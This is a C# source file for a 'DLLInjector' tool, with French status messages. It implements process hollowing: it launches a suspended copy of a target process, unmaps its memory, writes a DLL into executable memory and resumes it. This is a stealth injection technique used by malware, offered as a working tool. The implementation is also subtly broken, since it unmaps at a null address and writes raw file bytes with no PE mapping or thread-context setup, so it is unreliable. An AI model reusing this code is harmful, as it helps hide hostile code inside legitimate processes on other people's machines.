using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace DLLInjector.Injectors
{
    public class ProcessHollowingInjector
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;

        public static bool Inject(int processID, string dllPath)
        {
            if (!File.Exists(dllPath))
            {
                Console.WriteLine("Fichier DLL introuvable.");
                return false;
            }

            string targetProcessPath;
            try
            {
                targetProcessPath = Process.GetProcessById(processID).MainModule.FileName;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Impossible de récupérer le chemin du processus : {ex.Message}");
                return false;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;

            if (!CreateProcess(targetProcessPath, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("Échec de la création du processus suspendu.");
                return false;
            }

            byte[] dllBytes = File.ReadAllBytes(dllPath);
            IntPtr hProcess = pi.hProcess;

            if (NtUnmapViewOfSection(hProcess, IntPtr.Zero) != 0)
            {
                Console.WriteLine("Échec du déchargement du processus cible.");
                return false;
            }

            IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocatedMemory == IntPtr.Zero)
            {
                Console.WriteLine("Échec de l'allocation mémoire.");
                return false;
            }

            if (!WriteProcessMemory(hProcess, allocatedMemory, dllBytes, (uint)dllBytes.Length, out _))
            {
                Console.WriteLine("Échec de l'écriture en mémoire.");
                return false;
            }

            ResumeThread(pi.hThread);
            Console.WriteLine("Injection réussie via Process Hollowing.");
            return true;
        }
    }
}
